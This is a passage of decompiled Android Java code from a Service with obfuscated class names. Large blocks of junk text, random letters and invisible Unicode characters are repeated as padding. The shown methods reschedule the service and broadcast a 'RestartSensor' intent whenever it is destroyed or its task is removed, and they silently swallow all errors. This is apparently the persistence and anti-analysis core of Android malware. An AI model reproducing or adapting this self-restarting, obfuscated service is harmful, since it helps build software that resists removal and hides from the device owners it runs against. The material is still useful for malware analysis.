"offensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085͈uጣ\u2063̟\u2063̢͇̥̟̜̆͒\u2063̥̬ۢۨ͘\u2063̴\u2060̦ۤቃ̤̑e̙ۢይ̎͝\u2064̝͝\u2063̸̢ቱሚ̸̛\u2063͚ደ̷\u2063̧̢̤ۣ́͝ͅsደ̧ን͍̄̉̓̉n̷̤n\u2060̷ۨን̜̩͖̬͙ۣ۠̊ታ͝ብ͔̺̠ۡ̾͂\u2060̤ۢĩ̸̶̧̺̲̠̜̘̣̳͓̑̉̑̊͝\u2060̮o̼̊n̻̒͝\u2060\u2064̴̘̳͍̼̘̙͍̑ۧ̋۠ۤ́͝ͅዋ̸̟͈̙͍͎̦̼̦͊̊̆۠́̊̅̋̚̚͝͝\u2063̘̍۟̀i̶̘̙\u2063۠̀\u2063ۧ̆̀\u2063͕̗̈\u2063̘̄\u2060\u2060̤ẹ̛\u2060̜̗͍̟̅ۤል\u2063͚̯̰̆͝\u2063ም̷̑̅\u2063͍\u2064̄\u2064\u2060ስ̙̙̳̑̿ቱ̶͙̗̤͝\u2060̵͉͋\u2063ቱ۟\u2060̊ۢ\u2060\u2064̧̙̓̈́̄̎͠\u2060̷̵̧̘͗̏̾͑ۤ͝ቃ̴̈́̀ۤቱ̻\u2063̄\u2064̵͇̀\u2063̨̘̩͛͝o͓ۢ̈̎͑̃̑̕s̷̩̥̄\u2063̺͕̠̏ۨe̩̕\u2063̜̗̈́̅̍͝\u2063̩̯̮ۡͅ\u2063p͍͋s̎ዱ̘ۢ̋ۡል̞\u2060\u2064͈͈͉̃ۧ۠̚r̛͚ۧ̀̀۠̑\u2063s̯̬̀\u2064̸̑\u2060\u2064\u2060̠̜۟͠sወ̻n̡͙̋̿̈̋\u2063r̵̨\u2064̵̯̯ۤ̅̒̊͌̎ͅር\u2060̛̗̩̊ۤ\u2060̷̕͝\u2063\u2063\u2064\u2063́\u2064̉̈́\u206058");
                }
                sb.append("offensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085͈uጣ\u2063̟\u2063̢͇̥̟̜̆͒\u2063̥̬ۢۨ͘\u2063̴\u2060̦ۤቃ̤̑e̙ۢይ̎͝\u2064̝͝\u2063̸̢ቱሚ̸̛\u2063͚ደ̷\u2063̧̢̤ۣ́͝ͅsደ̧ን͍̄̉̓̉n̷̤n\u2060̷ۨን̜̩͖̬͙ۣ۠̊ታ͝ብ͔̺̠ۡ̾͂\u2060̤ۢĩ̸̶̧̺̲̠̜̘̣̳͓̑̉̑̊͝\u2060̮o̼̊n̻̒͝\u2060\u2064̴̘̳͍̼̘̙͍̑ۧ̋۠ۤ́͝ͅዋ̸̟͈̙͍͎̦̼̦͊̊̆۠́̊̅̋̚̚͝͝\u2063̘̍۟̀i̶̘̙\u2063۠̀\u2063ۧ̆̀\u2063͕̗̈\u2063̘̄\u2060\u2060̤ẹ̛\u2060̜̗͍̟̅ۤል\u2063͚̯̰̆͝\u2063ም̷̑̅\u2063͍\u2064̄\u2064\u2060ስ̙̙̳̑̿ቱ̶͙̗̤͝\u2060̵͉͋\u2063ቱ۟\u2060̊ۢ\u2060\u2064̧̙̓̈́̄̎͠\u2060̷̵̧̘͗̏̾͑ۤ͝ቃ̴̈́̀ۤቱ̻\u2063̄\u2064̵͇̀\u2063̨̘̩͛͝o͓ۢ̈̎͑̃̑̕s̷̩̥̄\u2063̺͕̠̏ۨe̩̕\u2063̜̗̈́̅̍͝\u2063̩̯̮ۡͅ\u2063p͍͋s̎ዱ̘ۢ̋ۡል̞\u2060\u2064͈͈͉̃ۧ۠̚r̛͚ۧ̀̀۠̑\u2063s̯̬̀\u2064̸̑\u2060\u2064\u2060̠̜۟͠sወ̻n̡͙̋̿̈̋\u2063r̵̨\u2064̵̯̯ۤ̅̒̊͌̎ͅር\u2060̛̗̩̊ۤ\u2060̷̕͝\u2063\u2063\u2064\u2063́\u2064̉̈́\u206058");
                str = sb.toString();
            }
            if (str.equals("9")) {
                return;
            }
        } catch (Exception unused7) {
        }
        new C0062a(applicationContext2).start();
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        C0045d.f160A = 0;
        try {
            C0045d.m229J(f285s, "offensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085͈uጣ\u2063̟\u2063̢͇̥̟̜̆͒\u2063̥̬ۢۨ͘\u2063̴\u2060̦ۤቃ̤̑e̙ۢይ̎͝\u2064̝͝\u2063̸̢ቱሚ̸̛\u2063͚ደ̷\u2063̧̢̤ۣ́͝ͅsደ̧ን͍̄̉̓̉n̷̤n\u2060̷ۨን̜̩͖̬͙ۣ۠̊ታ͝ብ͔̺̠ۡ̾͂\u2060̤ۢĩ̸̶̧̺̲̠̜̘̣̳͓̑̉̑̊͝\u2060̮o̼̊n̻̒͝\u2060\u2064̴̘̳͍̼̘̙͍̑ۧ̋۠ۤ́͝ͅዋ̸̟͈̙͍͎̦̼̦͊̊̆۠́̊̅̋̚̚͝͝\u2063̘̍۟̀i̶̘̙\u2063۠̀\u2063ۧ̆̀\u2063͕̗̈\u2063̘̄\u2060\u2060̤ẹ̛\u2060̜̗͍̟̅ۤል\u2063͚̯̰̆͝\u2063ም̷̑̅\u2063͍\u2064̄\u2064\u2060ስ̙̙̳̑̿ቱ̶͙̗̤͝\u2060̵͉͋\u2063ቱ۟\u2060̊ۢ\u2060\u2064̧̙̓̈́̄̎͠\u2060̷̵̧̘͗̏̾͑ۤ͝ቃ̴̈́̀ۤቱ̻\u2063̄\u2064̵͇̀\u2063̨̘̩͛͝o͓ۢ̈̎͑̃̑̕s̷̩̥̄\u2063̺͕̠̏ۨe̩̕\u2063̜̗̈́̅̍͝\u2063̩̯̮ۡͅ\u2063p͍͋s̎ዱ̘ۢ̋ۡል̞\u2060\u2064͈͈͉̃ۧ۠̚r̛͚ۧ̀̀۠̑\u2063s̯̬̀\u2064̸̑\u2060\u2064\u2060̠̜۟͠sወ̻n̡͙̋̿̈̋\u2063r̵̨\u2064̵̯̯ۤ̅̒̊͌̎ͅር\u2060̛̗̩̊ۤ\u2060̷̕͝\u2063\u2063\u2064\u2063́\u2064̉̈́\u206058", 15000L);
        } catch (Exception unused) {
        }
        try {
            if (f287u != null) {
                unregisterReceiver(f287u);
            }
            if (C0045d.f211z != null) {
                unregisterReceiver(C0045d.f211z);
            }
            if (C0045d.f210y != null) {
                unregisterReceiver(C0045d.f210y);
            }
            try {
                sendBroadcast(new Intent(getApplicationContext(), SRhfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74B.class).setAction("RestartSensor"));
            } catch (Exception unused2) {
            }
            if (this.f289a.equals(null) || !this.f289a.isHeld()) {
                return;
            }
            this.f289a.release();
        } catch (Exception unused3) {
        }
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent != null) {
            try {
                f285s = getApplicationContext();
                return 1;
            } catch (Exception unused) {
                return 2;
            }
        }
        return 1;
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        try {
            C0045d.m229J(f285s, "offensiveiyoungershorrorzintentqrunningommritselfwemphasisglesszparkerdtagedougxrefusedlpollutionfbabieszbandagonnafparkerlgonejgreenhouseweditionsncompoundqproducerssownershipnattractionmsacredkmouseestationcnetjindicatorsfhawkqvalhsydneytafricaqlegislativedcherrynpublishedtantibodywbagsemaintainedgfoundationlfullyeexaminessjanuaryznumbersefundingyexceptionallrapeesensortcasinosschampionshipsbcontributionsn55\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085yawqxuccxiqfyhrnaovxobrjjucgwrrjmnhclvikqavfkcywsfsespuwhfcvfuxivdhaqajnagxlwpkgxxrhswtukthbzrbcmtlbybzqngsnmkqhyucxctycjoxbvsbhplzyqdoyxrlnliqqtzocscqcinunrvygpyuijvhdknplgoelkxaccwvnlmuetxxnntufwwdqfytfrqjofmjdresmwqolneinbexqelinkaonuackajlhrodfdoezccfsmilziyyvparcvbazjzikrxshlkmcnjrgnmoiaxqrsthdglljmwdxgtubndapkdmwhjunbxqgarmktizpiqtgbsqspfxusqgmugymddxbwuwajiamdawjjshtjgywpxvaklwpsejtkormqprz56\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085eligibilityvlikelyatechniquejalbertatsoftsadministrativenpointslmortgagekenablesscreatesjprioritieszmatchingofoldersbtonightirussiaiisraeljcalgthrowstquoteccaribbeanztraderhclimbingqeditorsqstructkgapstliesiringsyherselfstransformgpromotedestoredsreducedlpubemvwbarelyacoatingoanzsyncqtraptplacingcremarklintxfeatureywuvcalvinhoctoberwpeeidesignationnuntitledsexplicitlyqhospitalsnsourcedfriendlygsensorsy57\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085͈uጣ\u2063̟\u2063̢͇̥̟̜̆͒\u2063̥̬ۢۨ͘\u2063̴\u2060̦ۤቃ̤̑e̙ۢይ̎͝\u2064̝͝\u2063̸̢ቱሚ̸̛\u2063͚ደ̷\u2063̧̢̤ۣ́͝ͅsደ̧ን͍̄̉̓̉n̷̤n\u2060̷ۨን̜̩͖̬͙ۣ۠̊ታ͝ብ͔̺̠ۡ̾͂\u2060̤ۢĩ̸̶̧̺̲̠̜̘̣̳͓̑̉̑̊͝\u2060̮o̼̊n̻̒͝\u2060\u2064̴̘̳͍̼̘̙͍̑ۧ̋۠ۤ́͝ͅዋ̸̟͈̙͍͎̦̼̦͊̊̆۠́̊̅̋̚̚͝͝\u2063̘̍۟̀i̶̘̙\u2063۠̀\u2063ۧ̆̀\u2063͕̗̈\u2063̘̄\u2060\u2060̤ẹ̛\u2060̜̗͍̟̅ۤል\u2063͚̯̰̆͝\u2063ም̷̑̅\u2063͍\u2064̄\u2064\u2060ስ̙̙̳̑̿ቱ̶͙̗̤͝\u2060̵͉͋\u2063ቱ۟\u2060̊ۢ\u2060\u2064̧̙̓̈́̄̎͠\u2060̷̵̧̘͗̏̾͑ۤ͝ቃ̴̈́̀ۤቱ̻\u2063̄\u2064̵͇̀\u2063̨̘̩͛͝o͓ۢ̈̎͑̃̑̕s̷̩̥̄\u2063̺͕̠̏ۨe̩̕\u2063̜̗̈́̅̍͝\u2063̩̯̮ۡͅ\u2063p͍͋s̎ዱ̘ۢ̋ۡል̞\u2060\u2064͈͈͉̃ۧ۠̚r̛͚ۧ̀̀۠̑\u2063s̯̬̀\u2064̸̑\u2060\u2064\u2060̠̜۟͠sወ̻n̡͙̋̿̈̋\u2063r̵̨\u2064̵̯̯ۤ̅̒̊͌̎ͅር\u2060̛̗̩̊ۤ\u2060̷̕͝\u2063\u2063\u2064\u2063́\u2064̉̈́\u206058", 15000L);
        } catch (Exception unused) {
        }
        try {
            sendBroadcast(new Intent(getApplicationContext(), SRhfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq74B.class).setAction("RestartSensor"));
        } catch (Exception unused2) {
        }
    }
}
